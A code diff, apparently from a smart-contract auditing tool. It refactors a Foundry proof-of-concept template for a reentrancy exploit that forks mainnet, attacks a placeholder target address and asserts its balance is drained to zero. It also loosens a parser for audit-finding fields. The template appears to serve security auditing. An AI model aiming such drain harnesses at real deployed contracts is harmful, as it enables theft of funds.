@@ -17,6 +17,11 @@ pragma solidity ^0.8.10;
 import "forge-std/Test.sol";
 import "forge-std/console.sol";
 
+interface IVulnerable {
+    function deposit() external payable;
+    function withdraw(uint256 amount) external;
+}
+
 contract ReentrancyExploit {
     IVulnerable target;
     uint256 attackAmount = 1 ether;
@@ -39,6 +44,7 @@ contract ReentrancyExploit {
 
 contract ExploitPoC is Test {
     address constant TARGET = {target_addr};
+    uint256 constant ATTACK_AMOUNT = 1 ether;
 
     function setUp() public {
         vm.createSelectFork(vm.envString("MAINNET_RPC_URL"), {fork_block});
@@ -47,18 +53,18 @@ contract ExploitPoC is Test {
 
     function testExploit() public {
         ReentrancyExploit exploit = new ReentrancyExploit(TARGET);
-        vm.deal(address(exploit), attackAmount);
+        vm.deal(address(exploit), ATTACK_AMOUNT);
 
         uint256 before = address(TARGET).balance;
         console.log("Protocol balance before:", before);
 
         exploit.attack();
 
-        uint256 after = address(TARGET).balance;
-        console.log("Protocol balance after:", after);
-        console.log("Drained:", before - after);
+        uint256 balanceAfter = address(TARGET).balance;
+        console.log("Protocol balance after:", balanceAfter);
+        console.log("Drained:", before - balanceAfter);
 
-        assertEq(after, 0, "Drain failed");
+        assertEq(balanceAfter, 0, "Drain failed");
     }
 }""",
 
@@ -234,23 +240,23 @@ def _extract_findings(report: str) -> List[Dict]:
     lines = report.split("\n")
     current = {}
     for line in lines:
-        s = line.strip()
-        if s.startswith("- **Name**"):
+        s = re.sub(r"^(?:[-*+•]|\d+[.)])\s*", "", line.strip())
+        if s.startswith("**Name**"):
             if current and current.get("name"):
                 findings.append(current)
             current = {"name": s.split(":", 1)[1].strip() if ":" in s else ""}
-        elif s.startswith("- **Severity**") and current:
+        elif s.startswith("**Severity**") and current:
             current["severity"] = s.split(":", 1)[1].strip().rstrip("*") if ":" in s else "Medium"
-        elif s.startswith("- **Category**") and current:
+        elif s.startswith("**Category**") and current:
             current["category"] = s.split(":", 1)[1].strip() if ":" in s else ""
-        elif s.startswith("- **Description**") and current:
+        elif s.startswith("**Description**") and current:
             desc = s.split(":", 1)[1].strip() if ":" in s else ""
             current["description"] = desc
-        elif s.startswith("- **Exploit**") and current:
+        elif s.startswith("**Exploit**") and current:
             current["exploit"] = s.split(":", 1)[1].strip() if ":" in s else ""
-        elif s.startswith("- **Fix**") and current:
+        elif s.startswith("**Fix**") and current:
             current["fix"] = s.split(":", 1)[1].strip() if ":" in s else ""
-        elif s.startswith("- **PoC**") and current:
+        elif s.startswith("**PoC**") and current:
             current["poc"] = s.split(":", 1)[1].strip() if ":" in s else ""
     if current and current.get("name"):
         findings.append(current)
